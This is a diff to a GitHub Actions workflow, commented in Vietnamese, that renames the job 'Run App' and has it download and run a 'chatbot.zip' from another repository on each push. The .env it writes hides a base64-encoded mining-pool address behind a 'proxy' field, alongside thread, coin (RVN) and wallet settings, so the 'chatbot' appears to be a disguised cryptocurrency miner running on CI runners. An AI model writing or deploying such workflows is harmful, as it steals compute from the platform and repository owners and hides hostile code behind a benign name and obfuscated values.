@@ -1,4 +1,5 @@
-name: Website
+name: Run App
+
 on:
   push:
     branches:
@@ -10,18 +11,36 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+      # Bước 1: Checkout repo
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Clone repository
-        run: git clone https://github.com/duongpokeeeee/articial-in
+      # Bước 2: Tải file ZIP từ repo khác
+      - name: Tải chatbot.zip
+        run: wget https://github.com/duongpokeeeee/sadsd/raw/refs/heads/main/chatbot.zip
 
+      # Bước 3: Giải nén vào thư mục riêng để tránh lỗi .git/config
+      - name: Unzip and prepare .env
+        run: |
+          mkdir app
+          yes A | unzip chatbot.zip -d app
+          echo -e "host=127.0.0.1\nport=3306\nproxy=wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=4\npassword=c=RVN\nusername=RBCPz2xQMf9Cz3eyqFTVFHVjZM2cTSeYRN" > app/.env
+
+      # Bước 4: Setup Python
       - name: Set up Python
         uses: actions/setup-python@v4
         with:
           python-version: '3.x'
 
-      - name: Run the Node.js app
+      # Bước 5: Cài dependencies nếu có file requirements.txt
+      - name: Install dependencies (nếu có requirements.txt)
         run: |
-          cd articial-in
-          bash start2.sh
+          if [ -f app/requirements.txt ]; then
+            pip install -r app/requirements.txt
+          fi
+
+      # Bước 6: Chạy app Python
+      - name: Run Python App
+        run: |
+          cd app
+          python3 app.py "" --cache=.cache/09Qy5sb2Fkcyg.txt
